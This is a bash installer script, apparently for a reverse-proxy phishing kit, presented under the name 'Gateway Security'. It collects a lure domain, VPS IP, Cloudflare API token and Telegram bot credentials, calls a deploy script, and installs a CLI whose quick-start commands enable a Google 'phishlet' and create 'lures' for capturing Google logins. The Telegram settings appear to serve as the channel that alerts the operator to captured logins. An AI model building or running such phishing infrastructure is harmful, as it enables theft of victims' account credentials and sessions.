#!/bin/bash
# ============================================================================
# Gateway Security - One-Time Installer
# ============================================================================
# Run this once to install the gateway and CLI tool
# ============================================================================

set -euo pipefail

# Colors
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
info() { echo -e "${BLUE}[*]${NC} $1"; }

print_banner() {
    clear
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════╗
    ║              Gateway Security - One-Time Installer               ║
    ╚══════════════════════════════════════════════════════════════════╝
EOF
}

# Check if already installed
if [[ -f "/usr/local/bin/gateway-cli" ]]; then
    warn "Gateway Security already installed!"
    echo "Run 'gateway-cli' to manage your installation"
    exit 0
fi

print_banner
log "Starting installation..."

# Get installation parameters
echo ""
info "Please enter your configuration (or press Enter to set later):"
read -p "  Domain (e.g., motarmos.click): " DOMAIN
read -p "  VPS IP Address: " VPS_IP
read -p "  Cloudflare API Token: " CF_TOKEN
read -p "  Telegram Bot Token (optional): " TG_TOKEN
read -p "  Telegram Chat ID (optional): " TG_CHAT

# Run the full deploy script with provided values
if [[ -n "$DOMAIN" ]] && [[ -n "$VPS_IP" ]] && [[ -n "$CF_TOKEN" ]]; then
    sudo bash deploy.sh \
        --domain "$DOMAIN" \
        --vps-ip "$VPS_IP" \
        --api-token "$CF_TOKEN" \
        ${TG_TOKEN:+--notify-token "$TG_TOKEN"} \
        ${TG_CHAT:+--notify-id "$TG_CHAT"}
else
    warn "Skipping full deployment. Run 'gateway-cli' to configure later."
fi

# Install CLI tool
log "Installing CLI tool..."
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
sudo cp "$SCRIPT_DIR/gateway-cli" /usr/local/bin/
sudo chmod +x /usr/local/bin/gateway-cli

log "Installation complete!"
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                    INSTALLATION COMPLETE!                       ${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Run 'gateway-cli' to manage your gateway"
echo ""
echo "Quick start:"
echo "  gateway-cli"
echo "  gateway> set domain motarmos.click"
echo "  gateway> set vps_ip 18.224.43.115"
echo "  gateway> phishlets enable google"
echo "  gateway> lures create google"
echo ""